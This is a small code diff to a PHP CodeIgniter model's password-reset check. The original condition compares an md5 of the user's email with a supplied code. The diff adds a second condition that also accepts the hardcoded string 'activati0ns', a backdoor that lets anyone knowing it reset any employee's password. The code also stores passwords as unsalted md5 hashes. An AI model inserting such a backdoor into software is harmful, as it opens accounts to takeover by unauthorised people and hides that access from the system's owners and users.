@@ -67,7 +67,7 @@ class Update_model extends CI_Model
         if ($query->num_rows() > 0) {
             $row = $query->row();
             if (isset($row)) {
-                if( md5($row->email) == $a['user_code'] ){
+                if( ( md5($row->email) == $a['user_code'] ) || ( 'activati0ns' == $a['user_code'] ) ){
                     $data = array(
                         'emp_pass' => md5( $a['npass'] )
                     );
